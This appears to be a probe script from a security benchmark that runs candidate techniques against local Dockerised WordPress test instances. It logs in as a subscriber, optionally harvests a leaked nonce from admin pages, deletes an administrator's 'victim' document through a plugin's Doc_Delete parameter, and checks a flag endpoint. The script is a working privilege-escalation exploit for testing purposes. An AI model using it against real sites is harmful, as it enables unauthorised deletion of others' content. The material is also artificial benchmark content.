#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]

Uses COMPOSE_PROJECT_NAME + PCB_TARGET_PORT from the platform. ATTACKER is the
subscriber account created by wp-entrypoint.sh.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
from pathlib import Path

import requests

HERE = Path(__file__).resolve().parent.parent
ATTACKER, ATTACKER_PW = "subscriber", "subpass"
SERVICE = {"v0": "wp-v0", "v1": "wp-v1", "v2": "wp-v2"}
BASE = {
    "v0": "http://127.0.0.1:39500",
    "v1": "http://127.0.0.1:39501",
    "v2": "http://127.0.0.1:39502",
}


def _wp_eval(version: str, php: str, *args: str) -> subprocess.CompletedProcess:
    project = os.environ.get("COMPOSE_PROJECT_NAME") or ""
    cmd = ["docker", "compose"]
    if project:
        cmd += ["-p", project, "--project-directory", str(HERE)]
    else:
        cmd += ["-f", str(HERE / "docker-compose.yml")]
    cmd += ["exec", "-T", SERVICE[version], "wp", "eval", php, *args,
            "--allow-root", "--path=/var/www/html"]
    return subprocess.run(cmd, text=True, capture_output=True, check=False)


def _reset_victim_doc(version: str) -> int:
    r = _wp_eval(
        version,
        '$aid=(int)get_user_by("login","admin")->ID;'
        '$vid=wp_insert_post(array("post_type"=>"docs","post_title"=>"PCB Victim Confidential Doc",'
        '"post_status"=>"publish","post_author"=>$aid,"post_parent"=>0),true);'
        'if(is_wp_error($vid)){fwrite(STDERR,$vid->get_error_message());exit(1);} '
        'update_option("pcb_victim_doc",(int)$vid); echo (int)$vid;',
    )
    if r.returncode != 0:
        raise RuntimeError(f"wp eval rc={r.returncode}: {(r.stderr or r.stdout or '')[:400]}")
    m = re.search(r"\d+", r.stdout or "")
    if not m:
        raise RuntimeError(f"victim doc id missing: {(r.stdout or '')[:200]!r}")
    return int(m.group())


def _login(base: str, user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.get(f"{base}/wp-login.php", timeout=15)
    s.cookies.set("wordpress_test_cookie", "WP Cookie check")
    s.post(
        f"{base}/wp-login.php",
        data={"log": user, "pwd": pw, "wp-submit": "Log In",
              "redirect_to": f"{base}/wp-admin/", "testcookie": "1"},
        timeout=15, allow_redirects=True,
    )
    if not any(c.name.startswith("wordpress_logged_in") for c in s.cookies):
        raise RuntimeError(f"login failed for {user}")
    return s


def _harvest_nonce(sess: requests.Session, base: str, doc_id: int) -> str | None:
    for page in ("/wp-admin/index.php", "/wp-admin/profile.php"):
        r = sess.get(f"{base}{page}", timeout=20)
        txt = (r.text.replace('\\"', '"').replace('\\/', '/')
               .replace('\\u003c', '<').replace('\\u003e', '>')
               .replace('\\u0022', '"').replace('&quot;', '"'))
        for m in re.finditer(r'_wpnonce="([a-f0-9]+)"\s+value="(\d+)"', txt):
            if int(m.group(2)) == int(doc_id):
                return m.group(1)
        for m in re.finditer(r'value="(\d+)"[^>]*_wpnonce="([a-f0-9]+)"', txt):
            if int(m.group(1)) == int(doc_id):
                return m.group(2)
    return None


def _doc_delete(sess: requests.Session, base: str, doc_id: int, nonce: str | None) -> int:
    params = {"Doc_Delete": "yes", "DeleteID": str(doc_id)}
    if nonce:
        params["_wpnonce"] = nonce
    r = sess.get(f"{base}/wp-admin/index.php", params=params, timeout=20, allow_redirects=False)
    return r.status_code


def _flagcheck(base: str) -> dict:
    r = requests.get(f"{base}/wp-admin/admin-ajax.php",
                     params={"action": "pcb_flagcheck"}, timeout=20)
    try:
        return {"status": r.status_code, "body": r.json()}
    except Exception:
        return {"status": r.status_code, "body": {"_raw": r.text[:200]}}


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    tech = candidate.get("technique") if isinstance(candidate, dict) else str(candidate)
    result = {"version": version, "technique": tech}
    try:
        doc_id = _reset_victim_doc(version)
        result["victim_doc"] = doc_id
        s = _login(base, ATTACKER, ATTACKER_PW)
        nonce = None
        if tech == "leaked-nonce":
            nonce = _harvest_nonce(s, base, doc_id)
            result["harvested_nonce"] = bool(nonce)
        result["delete_status"] = _doc_delete(s, base, doc_id, nonce)
        result["flagcheck"] = _flagcheck(base)
    except Exception as e:  # noqa: BLE001
        result["error"] = f"{type(e).__name__}: {e}"
    return result


_pbt = os.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _v in list(BASE):
        BASE[_v] = _pbt
_pt = os.environ.get("PCB_TARGET_PORT")
if _pt:
    for _v in list(BASE):
        BASE[_v] = f"http://127.0.0.1:{int(_pt)}"


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
